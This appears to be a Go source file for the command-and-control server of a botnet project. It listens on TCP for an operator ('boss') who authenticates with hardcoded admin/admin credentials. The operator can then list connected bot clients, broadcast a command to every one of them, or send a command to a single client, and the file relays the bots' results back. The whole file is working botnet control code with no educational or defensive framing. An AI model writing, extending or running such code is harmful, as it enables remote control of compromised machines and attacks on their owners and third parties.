package boss

import (
	"bufio"
	"encoding/json"
	"errors"
	"log"
	"net"
	"strconv"
	"strings"

	"github.com/satori/go.uuid"

	"github.com/phanletrunghieu/bot-net/common/cmd"
	"github.com/phanletrunghieu/bot-net/server/domain"
	"github.com/phanletrunghieu/bot-net/server/service/client"
)

// Service struct
type Service struct {
	listener      net.Listener
	Bosses        map[uuid.UUID]*domain.Boss
	clientService *client.Service
	Error         chan error
}

// NewBossService create tcpService struct
func NewBossService(port int, clientService *client.Service) *Service {
	ln, err := net.Listen("tcp", ":"+strconv.Itoa(port))

	service := &Service{
		clientService: clientService,
		listener:      ln,
		Bosses:        make(map[uuid.UUID]*domain.Boss),
		Error:         make(chan error),
	}

	if err != nil {
		service.Error <- err
	}

	return service
}

// Run wait for a connection
func (s *Service) Run() {
	s.acceptConnection()
}

func (s *Service) acceptConnection() {
	for {
		conn, err := s.listener.Accept()
		if err != nil {
			s.Error <- err
			continue
		}

		boss := &domain.Boss{
			ID:   uuid.NewV4(),
			Addr: conn.RemoteAddr(),
			Conn: conn,
		}

		go s.handleConnection(boss)
	}
}

func (s *Service) authenticate(boss *domain.Boss) error {
	msg, err := bufio.NewReader(boss.Conn).ReadString('\r')
	if err != nil {
		return err
	}

	msg = strings.TrimSpace(msg)
	userInfo := strings.Split(msg, " ")
	log.Println("auth....", userInfo)
	if len(userInfo) != 2 {
		return errors.New("Fail to authenticate")
	}

	if userInfo[0] != "admin" || userInfo[1] != "admin" {
		return errors.New("Fail to authenticate")
	}

	boss.IsAuthenticated = true

	return nil
}

func (s *Service) handleConnection(boss *domain.Boss) {
	// auth
	for {
		err := s.authenticate(boss)
		if err != nil {
			boss.Conn.Write([]byte(cmd.Result + "Unauthenticated!\r"))
			s.Error <- err
		} else {
			break
		}
	}
	boss.Conn.Write([]byte(cmd.Result + "Authenticated!\r"))
	s.Bosses[boss.ID] = boss

	go s.receiveClientResult()

	// pass
	for {
		buffCommand := make([]byte, 2)
		_, err := boss.Conn.Read(buffCommand)
		if err != nil {
			s.Error <- err
			return
		}

		switch string(buffCommand) {
		case cmd.ListClients:
			buffClients, err := json.Marshal(s.clientService.ListClientID())
			if err != nil {
				s.Error <- err
				break
			}

			buffClients = append(buffClients, '\r')
			buffClients = append([]byte(cmd.Result), buffClients...)
			boss.Conn.Write(buffClients)
			if err != nil {
				s.Error <- err
				break
			}

			break

		case cmd.Broadcast:
			msg, err := bufio.NewReader(boss.Conn).ReadString('\r')
			if err != nil {
				s.Error <- err
				break
			}

			msg = strings.TrimSpace(msg)

			for _, client := range s.clientService.Clients {
				err = s.clientService.SendDataToClient(client, boss, msg)
				if err != nil {
					// TODO: move error to boss
				}
			}
			break
		case cmd.UseClient:
			// get client id
			buffClientID := make([]byte, 16)
			_, err = boss.Conn.Read(buffClientID)
			if err != nil {
				s.Error <- err
				break
			}

			clientID, err := uuid.FromBytes(buffClientID)
			if err != nil {
				s.Error <- err
				continue
			}

			// get cmd
			msg, err := bufio.NewReader(boss.Conn).ReadString('\r')
			if err != nil {
				s.Error <- err
				break
			}

			msg = strings.TrimSpace(msg)

			// find client & send data
			for _, client := range s.clientService.Clients {
				if client.ID == clientID {
					err = s.clientService.SendDataToClient(client, boss, msg)
					if err != nil {
						// TODO: move error to boss
					}
				}
			}
			break
		}
	}
}

func (s *Service) receiveClientResult() {
	for {
		// 16 byte uuid
		msg := <-s.clientService.ClientResultChan
		buff := []byte(msg)

		bossID := make([]byte, 16)
		copy(bossID, buff[2:18])

		buff = append(buff[:2], buff[18:]...)
		buff = append(buff, '\r')

		id, err := uuid.FromBytes(bossID)
		if err != nil {
			s.Error <- err
			continue
		}

		if s.Bosses[id] == nil {
			log.Println("Boss id not found")
			continue
		}

		_, err = s.Bosses[id].Conn.Write(buff)
		if err != nil {
			s.Error <- err
			continue
		}
	}
}
